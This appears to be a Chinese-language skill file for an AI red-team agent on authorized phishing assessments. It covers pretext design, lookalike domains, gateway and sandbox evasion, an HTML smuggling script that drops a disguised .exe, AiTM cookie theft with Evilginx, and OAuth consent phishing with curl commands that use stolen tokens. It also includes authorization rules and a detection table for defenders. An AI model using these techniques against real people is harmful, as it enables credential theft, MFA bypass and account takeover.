---
name: social-engineering
description: Use for authorized social engineering and phishing assessment covering pretext design, email and OAuth phishing, payload delivery via LNK/ISO/HTML smuggling, and campaign measurement.
whenToUse: Use when the target's entry point is a person rather than a service — email gateway rules need testing, an OAuth consent flow is in scope, or you need to establish initial access without a network-reachable vulnerability.
source: dsh-purge original（按本仓模板撰写）
---

# 社工与钓鱼（Social Engineering / Phishing）

## 适用场景

- 授权范围内的钓鱼演练（邮件、短信、IM、电话 pretext）
- 邮件网关 / 安全邮件网关（SEG）规则有效性验证
- OAuth / SSO 同意钓鱼（绕 MFA 的主流路径）
- 内网无洞可打，需要「拿一个人」而不是「拿一台机」
- 供应链/外包场景：借第三方身份进入
- 红队报告里「人是入口」那一节

**不在本技能范围**：物理入侵（见 `hardware-security`）、无线伪造热点（见 `wifi-wireless`）。
虽然它们也属于「近源」，但工具链与授权流程不同。

## 铁律（先读，违反会直接把演练变成事故）

```text
MUST 先拿到书面授权，且写清：
  · 允许的载体（邮件 / 短信 / 电话 / 实物投放）
  · 允许冒用的品牌与身份（不能冒用真实高管姓名签名）
  · 不允许触碰的人群（法务 / HR 敏感线 / 孕妇 / 有医疗状况者）
  · 载荷红线：不投真实恶意代码、不投加密勒索、不收集与演练无关的个人数据
  · 应急停止方式（谁有权一票叫停、怎么叫停）
MUST NOT：
  · 使用真实的第三方品牌标识（法务风险），用自制近似标识
  · 收集凭据后去撞真实业务系统（除非明确授权）
  · 在钓鱼页里放真实登录框直连生产 SSO（凭据会真被记录）
  · 对同一批人连发三轮（第一轮是测试，第二轮是骚扰，第三轮是事故）
```

**为什么这些先写**：社工类演练最容易在「本来只想测网关、结果真把人骗了」这一步出事故。
技术上成功率最高的做法，往往正是授权最不允许的那一种 —— 这个矛盾必须由授权书裁决，不是由技术判断。

## 工作流

### Phase 1 — 目标画像（决定用什么 pretext）

不要一上来写邮件。**先回答「这批人为什么会点」**：

```text
□ 组织画像：行业、规模、近期大事件（并购 / 上市 / 裁员 / 系统迁移）
□ 技术栈画像：用什么邮箱（O365 / Google / 自建）、有没有 MFA、什么 SEG
□ 人群画像：按「会不会点」分层，不是按职级
   · 高价值低警惕：行政 / HR / 财务（流程驱动，习惯点链接）
   · 高价值高警惕：IT / 安全（要更精准的 pretext）
   · 低价值：实习 / 外包（可能没权限，但常是跳板）
□ 已被泄露的信息：LinkedIn 组织架构、GitHub 提交邮箱、历史泄露库
```

**pretext 选择矩阵**（不是随便挑一个，按画像对号）：

| 画像特征 | 首选 pretext | 为什么有效 | 风险 |
| --- | --- | --- | --- |
| 用 O365 + 有 MFA | **OAuth 同意钓鱼** | 不需要密码，MFA 不拦「你自己点的授权」 | 需要注册一个应用（留痕） |
| 用 O365/Google 且无 MFA | 伪造登录页 + AiTM 代理 | 能绕过后加的 MFA | 需要域名 + 证书 |
| 有强 SEG（Proofpoint/Mimecast） | **内部账号发信**（先拿一个邮箱） | 内部域信誉高，SEG 常放行 | 需要先有一次成功 |
| 有强 SEG 且拿不到内邮 | 短信 / IM / 电话 pretext | 完全绕开邮件网关 | 覆盖面小，需号码 |
| 研发型组织 | 假招聘 / 假开源项目 / 假 NPM 包 | 技术人员会对「技术内容」放松警惕 | 周期长 |
| 财务/供应链 | 假发票 / 假供应商变更账户 | 业务流程本来就要求点开附件 | 撞真实业务流程易被发现 |

### Phase 2 — 基础设施（域名、证书、投递通道）

```text
□ 域名：近似域名（typosquat）或 .zip/.mov 新 TLD；**注册前查是否被目标占用**
□ 证书：Let's Encrypt 即可（免费、自动）；用 DV 不是 EV（EV 反而显眼）
□ 邮件发送：独立 IP + SPF/DKIM/DMARC 自建，不要用公共 SMTP（信誉差）
□ 落地页：静态页托管在 VPS，不落目标所在国的司法辖区（合规考虑）
□ 追踪：每个目标一个唯一 URL 参数（谁点了、谁提交了）
```

**域名挑选的实操判据**（这里最容易白费功夫）：

```bash
# 1) 先看目标的真实域名结构，找可模仿的模式
#    例：target.com → 常见模仿 target-cn.com / target.com.cn / target-secure.com
# 2) 查候选是否已被注册 / 是否被安全厂商标记
whois target-secure.com
# 3) 查是否已进过钓鱼域名黑名单（进过就别用，邮件会直接被拦）
curl -s "https://check.spamhaus.org/query/domain/target-secure.com" | grep -i "listed"
# 4) 查域名年龄 —— 新注册域名（<30 天）会被 SEG 重点关照
whois target-secure.com | grep -i "creation date"
```

### Phase 3 — 投递与载荷

按「能不能过网关」从上到下试，**不要跳过第一档直接上复杂载荷**：

```text
第 1 档（最简单，过网关率最高，检出率也最高）
  · 纯文本 + 一个链接 → 落地页
  · 判据：SEG 拦不拦？拦了就往下走

第 2 档（绕链接扫描）
  · 链接指向「跳板页」→ 302 → 真实落地页（扫描器跟到跳板页就停）
  · 或链接指向合法服务（Google Docs / Notion / Dropbox）承载诱导内容

第 3 档（绕附件扫描）
  · HTML Smuggling（JS 在浏览器里拼出文件，静态扫描看不到载荷）
  · ISO / IMG 容器（内部文件不带 MOTW，绕过「来自 Internet」标记）
  · LNK 文件（伪装 PDF 图标，指向 powershell）

第 4 档（绕沙箱）
  · 落地页做环境检查（非目标地区 / 无头浏览器 / 沙箱 IP → 返回正常页面）
  · 附件延迟触发（打开后等 30s 再动，躲过沙箱的短时观察）
```

**HTML Smuggling 的最小可用写法**（自己拼，别找外部工具，减少依赖）：

```html
<!-- 伪装成「报表下载」，实际在浏览器里拼出文件 -->
<script>
const b64 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAA..."; // base64 的载荷
const bin = atob(b64);
const buf = new Uint8Array(bin.length);
for (let i = 0; i < bin.length; i++) buf[i] = bin.charCodeAt(i);
const blob = new Blob([buf], {type: "application/octet-stream"});
const a = document.createElement("a");
a.href = URL.createObjectURL(blob);
a.download = "2026-Q4-报表.xlsx.exe";  // 双扩展名，Windows 默认隐藏后者
a.click();
</script>
```

**验伤**：`download` 后的文件要能真跑起来，且**在不关 Defender 的情况下不被秒删**。
被秒删说明载荷签名/行为已被识别 —— 换载荷，不要反复投（每投一次都在训练对方的检测）。

### Phase 4 — AiTM（中间人代理，绕 MFA 的主流手法）

如果目标有 MFA 且不是 OAuth 场景，**普通伪造页拿不到有效会话**（用户输完 MFA 就发现是假的）。
AiTM 代理是能拿到「已通过 MFA 的会话 cookie」的唯一实用路径：

```text
原理：
  用户 → 反代（你的）→ 真实 SSO
  反代把真实 SSO 的页面透传给用户，用户以为在登录真站
  用户完成 MFA 后，反代拿到 session cookie 并保存
  你拿这个 cookie 直接进目标邮箱/网盘（不需要密码，也不需要再 MFA）

落地形态：
  · Evilginx（成熟，有 phishlet 机制，支持 O365/Okta 等）
  · 自建 nginx 反代 + cookie 提取（可控但工作量大）
  · 商业钓鱼平台（授权范围内才可用）

关键判据（这是最容易自欺的地方）：
  · 拿到 cookie ≠ 能进。必须**真的用这个 cookie 打开一个需要登录的页面**，
    看到目标真实数据（例如邮件列表里他本人的邮件）才算成功。
  · cookie 有时效（O365 通常几小时到几天），且会绑定一些环境特征。
  · 很多平台在检测到「同一 cookie 从两个地理位置使用」时会强制重新认证。
```

### Phase 5 — OAuth 同意钓鱼（不需要伪造页面，风险最低成功率最高）

```text
前提：目标用 O365 / Azure AD / Google Workspace
做法：
  1) 在目标租户可访问的范围注册一个应用（有些租户允许用户自行同意）
  2) 申请范围：Mail.Read / Files.ReadWrite / offline_access（refresh token）
  3) 诱导用户点「授权」链接 —— 页面是**微软/谷歌的真实页面**，不是假的
  4) 用户点「同意」→ 你的应用拿到 access_token + refresh_token

为什么有效：
  · 页面是真的，用户的安全意识在这里完全不起作用（「这是微软的页面啊」）
  · MFA 不拦（MFA 保护的是「认证」，这里是「授权」）
  · refresh_token 长期有效（默认 90 天，活跃使用可续期）

判据：
  · 拿到 token 后调一次 Graph API / Gmail API 确认能读到数据
  · 只拿到 access_token（没 refresh_token）= 效果有限，1 小时后失效
```

```bash
# 验证拿到的 token 真能用（O365）
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/me/messages?\$top=3" | head -c 500

# 刷新 token（确认 refresh_token 有效）
curl -s -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
  -d "client_id=$CLIENT_ID&grant_type=refresh_token&refresh_token=$RT"
```

**合规红线**：OAuth 应用注册会留下**明确的审计痕迹**（租户管理员能在「企业应用」里看到）。
在授权演练里这是加分项（可以测「管理员多久发现」），在非授权场景里这就是证据。

## 工具链

| 工具 | 用途 | 本机状态 / 说明 |
| --- | --- | --- |
| Evilginx | AiTM 反代 + phishlet | 需自行编译（Go）；**核心工具，优先准备** |
| GoPhish | 邮件campaign 管理与追踪 | 需自行部署（Go 单文件）；追踪统计齐全 |
| SET (Social-Engineer Toolkit) | 快速克隆落地页 | Kali 自带；克隆质量一般，适合快速验证 |
| Modlishka | AiTM 反代（Evilginx 的替代） | Go 单文件；phishlet 生态不如 Evilginx |
| King Phisher | 钓鱼 campaign 平台 | Python；适合有邮件列表的场景 |
| 自建 nginx + Lua | 完全可控的 AiTM | 无外部依赖；工作量最大 |
| O365 应用注册（官方门户） | OAuth 钓鱼基础设施 | 浏览器操作；会留审计痕迹 |

> **本机没有的**：Evilginx / GoPhish / SET 都不在 toolkit 里。这类工具要么自行编译
> （Go 项目 `go build`），要么在 VPS 上跑（钓鱼基础设施本来就不该放在被审计的机器上）。

## 参考（深水区，按需加载）

- `references/phishing-infra-playbook.md` —— 域名/证书/邮箱信誉（SPF/DKIM/DMARC 全配置）、
  跳板页与 302 链、落地页环境检查的具体写法、以及**为什么新域名会被拦**的实操判据。
- `references/oauth-consent-abuse.md` —— OAuth 同意钓鱼全流程：应用注册、范围选择、
  token 换取与续期、以及各平台（O365 / Google / Okta）的差异与检测点。
- `references/email-auth-checklist.md` —— SPF/DKIM/DMARC 现状检查（判断目标有没有部署，
  决定了「伪造发件人」这条路上不上得通）。
- `references/mailbox-abuse.md` —— 拿到邮箱之后的利用（EWS / Graph / 搜索 / 外发）。

**什么时候翻哪个**：
- 要搭基础设施 → `phishing-infra-playbook.md`
- 目标用 O365/Google 且有 MFA → `oauth-consent-abuse.md`（比 AiTM 更省事）
- 要先判断「伪造发件人能不能过」 → `email-auth-checklist.md`
- 已经拿到一个邮箱 → `mailbox-abuse.md`

## 落库要求

- 每次投递记 `redteam_chain_add`：`stage_code=initial`（或 `recon` 如果只是画像阶段），
  `tool` 写**载体类型 + pretext 类别**（不要写具体收件人姓名，报告对外时是敏感信息）。
- 成功率按「投递数 / 打开数 / 点击数 / 提交凭据数」四层记，**不要只记最终成功数** ——
  中间层数据才是「网关规则有效性」的证据。
- 拿到凭据必须立刻 `redteam_credential_add`，并在 `detail` 里写清**来源**（哪一轮、哪种 pretext）。

## 任务完成自检

- [ ] 授权书里写清了载体、人群、载荷红线、应急停止方式？
- [ ] pretext 是按目标画像选的，不是随便挑的？
- [ ] 每一档载荷的失败原因都记了（网关拦？沙箱拦？用户没点？）
- [ ] 声称「拿到凭据」时，是不是真的用它读到过目标数据？
- [ ] 报告里写清了「哪一层防护失效」（这是演练的核心交付，不是「骗到了几个人」）？

## ATT&CK 映射

> 本技能会执行的手法对应 MITRE ATT&CK v20.1 下列技术（编号来自 `lib/redteam/attack-map.js`，唯一来源）。

| 战术 | 编号 | 技术 |
| --- | --- | --- |
| 初始访问 | T1566 | 钓鱼（邮件 / 短信 / IM / 电话 pretext 全归这条） |
| 初始访问 | T1190 | 利用面向公众的应用（落地页托管面） |
| 初始访问 | T1078 | 有效账号（用骗到的凭据登录） |
| 凭据访问 | T1552.001 | 文件中的凭据（明文附件 / 落盘配置） |
| 凭据访问 | T1557 | 中间人攻击（AiTM 反代劫持会话） |
| 资源开发 | T1583 | 获取基础设施（域名 / 证书 / 发信 IP） |
| 资源开发 | T1587 | 开发能力（落地页 / 载荷 / 追踪系统） |
| 隐匿 | T1027 | 混淆文件或信息（HTML Smuggling / 加密载荷） |
| 隐匿 | T1553 | 颠覆信任控制（伪造发件人 / 假证书） |

落到事实库时，把这几个编号写进 `attack_step` 的标题或 `detail`：报告与检测配对要靠它们对齐；
**没写编号的动作在「按 ATT&CK 复核」时等于不存在**（防守方按技术编号查日志，查不到就是漏）。

## 检测视角（防守方在日志里看到什么）

| 动作 | 防守方看哪里 | 典型信号 |
| --- | --- | --- |
| 批量投递 | 邮件网关 / SEG 日志 | 同一发件域短时大量投递；SPF/DKIM 对不上；新注册域名（<30 天） |
| 落地页访问 | 代理 / DNS 日志 | 员工访问从未出现过的域名；URL 里带唯一标识参数 |
| 凭据提交 | IdP 登录日志 | 成功登录但 **UA / IP 与历史不符**；同账号两地同时在线 |
| AiTM 反代 | IdP 的 conditional access | 登录来源 IP 是 VPS/云厂商段；cookie 从两个地理位置使用 |
| OAuth 同意 | Azure AD 审计 / Google Workspace 审计 | **「Consent to application」事件**；新增企业应用；授予了 Mail.Read 等敏感范围 |
| 附件执行 | EDR / Sysmon 1 | Office 起 powershell；LNK 指向 powershell；ISO 挂载后执行 |
| HTML Smuggling | 浏览器 / 代理 | 下载的「文档」实际是 .exe/.dll；页面 JS 里有大段 base64 |

**实用推论**：**这类攻击的检测点几乎全在「身份侧」而不是「终端侧」**。
终端可以干净（没有恶意文件），但 IdP 日志里「一次成功登录但设备/位置全不对」是绕不过的。
所以演练时要重点测：**对方的 conditional access / 不可能旅行检测，多久报警**。
这也是为什么 OAuth 钓鱼值得单独测 —— 它的检测点（Consent 事件）很多组织根本没人看。

## 第二发（主力打不出去时，按这个顺序换）

1. **换载体**（邮箱打不通就换通道）：短信 / IM / 电话 pretext，或走 `supply-chain-security` 借第三方身份
2. **换手法**（附件全被拦）：转 OAuth 同意钓鱼（页面是真实微软页，网关完全无关）或 AiTM 反代
3. **前提没满足就先回去**：`passive-recon` —— 画像不准，pretext 一定选错
4. **无回显 / 被拦**：先用 `oob-verification` 确认是不是真没打进去（没回显 ≠ 没命中）
5. **需要进内网**：拿到凭据后转 `lateral-movement`；拿到 VPN 权限转 `attack-chain` 的远程接入段

**纪律**：同一批目标不许连发三轮（第一轮验证、第二轮换 pretext、第三轮必须换通道）；
换完还不动，就**如实回报**试过哪几条、各自现象是什么——这是下一次改打的依据，不是失败。



<!-- runnability:start scripts/inject-runnability.mjs 生成，勿手改 -->

## 本机可执行性（自动探测；命令是按 Linux/Kali 写的，照抄会撞空）

本技能命令用到的工具里，本机（PATH 与 toolkit 双探）没有：`evilginx`、`gophish`、`modlishka`
- `evilginx`：Go 项目，`git clone https://github.com/kgretzky/evilginx2 && cd evilginx2 && go build`（本机有 go）。**但它跑起来是一个对外反代服务，应该部署在 VPS 上，不要装在本机** —— 本机装它等于把钓鱼基础设施放在被审计的机器上
- `gophish`：官方发 `gophish-v<ver>-windows-64bit.zip`（含 exe，解压即用）。**同样应该放 VPS**：campaign 的追踪链接必须能被目标访问到，本机的 localhost 目标看不到
- `modlishka`：Go 项目，`go build`（本机有 go）。与 `evilginx` 同类，**部署在 VPS**；它的 phishlet 生态不如 evilginx，只在 evilginx 编译不过时当备选

runnability:end -->

<!-- skill-link-graph:build-skill-graph.mjs 生成，勿手改 -->

## 链路位置（本技能不是孤岛：上游先做、下游交给谁、结果落哪个库）

- **阶段**：1 信息收集｜**角色**：`recon`
- **上游**（先做完这些再进来）：`passive-recon`、`email-security`
- **下游**（产出交给谁）：`lateral-movement`、`shell-handler`、`identity-federation`
- **互补**（同类场景一起用）：`passive-recon`、`recon-pipeline`、`subdomain-bruteforce`
- **落库**（做完必须记进演练台，没落库的发现等于没发生）：`credential`、`access` —— 用对应的 `redteam_*` 工具写入，带上原始请求/证据
- **收口必做**（打完不算完，要能证明）：命中判定走 `verification-discipline`（误报排除 + 修复五档判定）；打完之后要**补丁后复测**（补丁/修复后再打一遍，确认真的关掉了，而不是换个入口还能打）也走它；说清对手能不能发现走 `detection-pairing`（检测规则 + 响度）；战果归到哪个战术走 `attack-traceability`（ATT&CK 映射）。**出交付物用 `redteam_report`**（kind=score 出计分战报、kind=targets 出靶标清单），整条链路串起来看用 `redteam_attack_chain` / `redteam_attack_path` —— 这两个只在 `redteam-setup` 的工具表里登记过，做具体攻击时不会想到去翻，所以在这里点名

- **配套工具**（做完这步要落库/查询时用，别只记在上下文里）：`redteam_sessions`（一屏看已上线 WebShell、隧道可达网段、凭据、访问会话）；`redteam_sessions`（同上：判断现在能往哪走，别凭记忆）

<!-- /skill-link-graph -->
